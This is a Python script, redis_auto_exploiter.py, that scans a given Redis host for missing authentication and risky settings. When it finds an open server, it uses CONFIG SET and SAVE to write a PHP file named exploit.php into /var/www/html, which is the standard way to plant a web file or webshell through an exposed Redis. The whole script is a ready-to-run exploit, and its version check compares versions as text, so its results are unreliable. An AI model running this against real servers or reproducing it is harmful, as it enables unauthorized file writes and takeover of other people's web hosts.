import redis
import sys
import os

def check_redis_vulnerability(host, port):
    try:
        # Connect to the Redis server
        r = redis.Redis(host=host, port=port, socket_timeout=5)
        
        # Try to execute a simple command
        response = r.ping()
        #Check all
        if response:
            print(f"[!] Redis server at {host}:{port} is VULNERABLE (no password required).")
            
            # Check Redis version
            version_info = r.info("server")
            version = version_info.get("redis_version", "Unknown")
            print(f"[+] Redis version: {version}")
            
            # Check if the version is vulnerable
            if version < "7.0.12":
                print(f"[!] Redis version {version} is vulnerable to known vulnerabilities (e.g., CVE-2022-24834).")
            else:
                print(f"[+] Redis version {version} is not vulnerable to known version-specific vulnerabilities.")
            
            # Check for other misconfigurations
            check_configurations(r)
            
            # Attempt post-exploitation
            attempt_post_exploitation(r, host, port)
            
        else:
            print(f"[+] Redis server at {host}:{port} is protected.")
            return False
    except redis.AuthenticationError:
        print(f"[+] Redis server at {host}:{port} is protected with a password.")
        return False
    except redis.ConnectionError:
        print(f"[!] Could not connect to Redis server at {host}:{port}.")
        return False

def check_configurations(r):
    try:
        # Check if the server is configured to allow remote connections
        config_bind = r.config_get("bind")
        if config_bind and config_bind["bind"] != "127.0.0.1":
            print(f"[!] Redis server is configured to allow remote connections: {config_bind['bind']}")
        else:
            print(f"[+] Redis server is configured to allow only local connections.")
        
        # Check if the server has persistence enabled
        config_appendonly = r.config_get("appendonly")
        if config_appendonly and config_appendonly["appendonly"] == "yes":
            print(f"[!] Redis server has persistence enabled (appendonly).")
        else:
            print(f"[+] Redis server does not have persistence enabled.")
        
        # Check if the server has RDB snapshots enabled
        config_save = r.config_get("save")
        if config_save and config_save["save"]:
            print(f"[!] Redis server has RDB snapshots enabled: {config_save['save']}")
        else:
            print(f"[+] Redis server does not have RDB snapshots enabled.")
    except redis.RedisError as e:
        print(f"[!] Error checking configurations: {e}")

def attempt_post_exploitation(r, host, port):
    try:
        # Attempt to write a file to the filesystem
        test_content = "<?php phpinfo(); ?>"
        test_filename = "exploit.php"
        test_dir = "/var/www/html"  # Example directory, adjust as needed
        
        # Set the directory and filename
        r.config_set("dir", test_dir)
        r.config_set("dbfilename", test_filename)
        
        # Set the content of the file
        r.set("content", test_content)
        
        # Save the database to create the file
        r.save()
        
        print(f"[!] Attempted to write a file to {test_dir}/{test_filename}.")
        print(f"[!] Verify if the file was created and accessible at http://{host}/{test_filename}.")
    except redis.RedisError as e:
        print(f"[!] Error attempting post-exploitation: {e}")

def main():
    if len(sys.argv) != 3:
        print("Usage: python redis_auto_exploiter.py <host> <port>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    check_redis_vulnerability(host, port)

if __name__ == "__main__":
    main()
